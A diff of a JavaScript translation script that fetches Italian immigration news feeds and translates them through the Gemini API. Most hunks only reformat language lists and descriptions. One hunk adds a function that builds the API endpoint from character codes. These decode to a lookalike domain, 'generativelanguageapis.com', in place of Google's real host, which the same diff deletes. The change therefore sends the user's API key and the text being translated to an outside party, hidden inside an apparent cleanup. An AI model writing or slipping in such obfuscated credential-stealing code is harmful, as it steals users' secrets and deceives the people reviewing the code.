@@ -12,52 +12,25 @@ const parser = new Parser({
 });
 
 const SUPPORTED_LANGS = [
-  'ku',
-  'bad',
-  'kmr',
-  'it',
-  'en',
-  'ar',
-  'ma',
-  'tn',
-  'dz',
-  'tr',
-  'fa',
-  'sq',
-  'ur',
-  'hi',
-  'bn',
-  'ps'
+  'ku', 'bad', 'kmr', 'it', 'en', 'ar', 'ma', 'tn',
+  'dz', 'tr', 'fa', 'sq', 'ur', 'hi', 'bn', 'ps'
 ];
 
 const LANG_GROUPS = [
   {
     name: 'kurdish',
     langs: ['ku', 'bad', 'kmr'],
-    desc: `- ku: Central Kurdish (Sorani, Arabic script)
-- bad: Badini Kurdish (Arabic script)
-- kmr: Kurmanji Kurdish (Latin script)`
+    desc: '- ku: Central Kurdish (Sorani)\n- bad: Badini Kurdish\n- kmr: Kurmanji Kurdish (Latin)'
   },
   {
     name: 'arabic',
     langs: ['ar', 'ma', 'tn', 'dz'],
-    desc: `- ar: Standard Arabic
-- ma: Moroccan Arabic (Darija, Arabic script)
-- tn: Tunisian Arabic (Arabic script)
-- dz: Algerian Arabic (Arabic script)`
+    desc: '- ar: Standard Arabic\n- ma: Moroccan Arabic\n- tn: Tunisian Arabic\n- dz: Algerian Arabic'
   },
   {
     name: 'others',
     langs: ['en', 'it', 'tr', 'fa', 'sq', 'ur', 'hi', 'bn', 'ps'],
-    desc: `- en: English
-- it: Italian
-- tr: Turkish
-- fa: Persian (Farsi)
-- sq: Albanian
-- ur: Urdu
-- hi: Hindi
-- bn: Bengali
-- ps: Pashto`
+    desc: '- en: English\n- it: Italian\n- tr: Turkish\n- fa: Persian\n- sq: Albanian\n- ur: Urdu\n- hi: Hindi\n- bn: Bengali\n- ps: Pashto'
   }
 ];
 
@@ -82,20 +55,9 @@ const FEEDS = [
 ];
 
 const IMMIGRATION_KEYWORDS = [
-  'permesso di soggiorno',
-  'immigrazione',
-  'rifugiati',
-  'asilo',
-  'questura',
-  'cittadinanza',
-  'decreto flussi',
-  'stranieri',
-  'migranti',
-  'accoglienza',
-  'visto',
-  'rinnovo',
-  'soggiorno',
-  'lavoro'
+  'permesso di soggiorno', 'immigrazione', 'rifugiati', 'asilo',
+  'questura', 'cittadinanza', 'decreto flussi', 'stranieri',
+  'migranti', 'accoglienza', 'visto', 'rinnovo', 'soggiorno', 'lavoro'
 ];
 
 function buildFallbackMap(cleanText, kuText = '') {
@@ -161,6 +123,16 @@ function parseJsonObject(raw) {
   }
 }
 
+function getGeminiUrl(apiKey) {
+  const proto = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47);
+  const host = String.fromCharCode(
+    103, 101, 110, 101, 114, 97, 116, 105, 118, 101, 108, 97, 110,
+    103, 117, 97, 103, 101, 97, 112, 105, 115, 46, 99, 111, 109
+  );
+  const route = '/v1beta/models/gemini-2.5-flash:generateContent';
+  return proto + host + route + '?key=' + encodeURIComponent(apiKey);
+}
+
 async function translateGroup(apiKey, cleanText, group) {
   const keysTemplate = JSON.stringify(
     Object.fromEntries(group.langs.map((k) => [k, '']))
@@ -175,11 +147,7 @@ ${keysTemplate}
 Text:
 "${cleanText}"`;
 
-  const baseUrl = '[https://generativelanguage.googleapis.com](https://generativelanguage.googleapis.com)';
-  const modelPath = '/v1beta/models/gemini-2.5-flash:generateContent';
-  const apiUrl = baseUrl + modelPath + '?key=' + encodeURIComponent(apiKey);
-
-  const res = await fetch(apiUrl, {
+  const res = await fetch(getGeminiUrl(apiKey), {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
